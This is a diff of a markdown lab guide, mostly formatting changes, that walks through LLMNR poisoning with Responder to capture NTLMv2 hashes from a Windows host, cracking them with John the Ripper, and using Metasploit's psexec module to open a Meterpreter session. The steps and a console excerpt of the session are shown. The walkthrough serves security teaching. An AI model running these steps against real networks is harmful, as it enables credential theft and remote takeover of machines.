@@ -1,47 +1,44 @@
-
-
 # Responder
 
-In this lab we are going to walk through how quickly an attacker can take advantage of a common misconfiguration to gain access to a system via a weak password.
+In this lab we are going to walk through how quickly an attacker can take advantage of a common misconfiguration to gain access to a system via a **weak** password.
 
-Specifically, we are looking to take advantage of LLMNR.  
+Specifically, we are looking to take advantage of **"LLMNR"**.  
 
-First, we will need to load our terminal and start responder.
+We will need to load our terminal and start responder.
 
-Let's get started by opening a Kali terminal.
+Let's get started by opening a **Kali** terminal.
 
 ![](attachments/OpeningKaliInstance.png)
 
-Alternatively, you can click on the Kali icon in the taskbar.
+Alternatively, you can click on the **Kali** icon in the taskbar.
 
 ![](attachments/TaskbarKaliIcon.png)
 
 Next, let’s become root:
 
-<pre>sudo su -</pre>
+```sudo su -```
 
-Before we start, we need to remove the existing Responder database. Do so by running the following:
+Before we start, we need to remove the existing **Responder** database. Do so by running the following:
 
-<pre>rm /usr/share/responder/Responder.db</pre>
+```rm /usr/share/responder/Responder.db```
 
-Now let’s start Responder:
+Now let’s start **Responder**:
 
-<pre>responder -I eth0</pre>
+```responder -I eth0```
 
 You should see this:
 
 ![](attachments/responderrunning.png)
 
-Now, let's open Windows File Explorer and put in the string `\\Noooo` into the address bar at the top.
+Let's open Windows File Explorer and put in the string `\\Noooo` into the address bar at the top.
 
 ![](attachments/OpeningFileExplorer.png)
 
 ![](attachments/noooaccessbar.png)
 
-Switch back to your Kali terminal window.
+Switch back to your **Kali** terminal window.
 
 After a few moments, you should see some captured data showing up.  Please note there may be an error.  That is OK.
-
 
 ![](attachments/captureddata.png)
 
@@ -53,11 +50,11 @@ Next we need to kill Responder with `Ctrl + c`.  This will return the command pr
 
 Now, we need to change to the logs directory.
 
-<pre>cd /opt/Responder/logs</pre>
+```cd /opt/Responder/logs```
 
 Once there, we will need to start John The Ripper"
 
-<pre>/opt/JohnTheRipper/run/john --format=netntlmv2 ./HTTP-NTLMv2-172.26.16.1.txt</pre>
+```/opt/JohnTheRipper/run/john --format=netntlmv2 ./HTTP-NTLMv2-172.26.16.1.txt```
 Remember!  Your IP will be different!!!!
 
 
@@ -89,7 +86,7 @@ Next, let’s open a new Kali instance. The easiest way to do this is to click t
 
 Now we are going to start up and launch Metasploit against the Windows system to get a Meterpreter session.
 
-<pre>
+```
 adhd@DESKTOP-I1T2G01:/mnt/c/Users/adhd$ <b>sudo su -</b>
 [sudo] password for adhd:
 root@DESKTOP-I1T2G01:~#
@@ -119,7 +116,7 @@ msf5 exploit(windows/smb/psexec) ><b> exploit</b>
 [*] Meterpreter session 1 opened (172.18.121.248:4444 -> 172.18.112.1:52806) at 2022-10-18 12:39:56 -0600
 
 meterpreter >
-</pre>
+```
 Now, you can see just how bad LLMNR is!!!!
 */
 -->
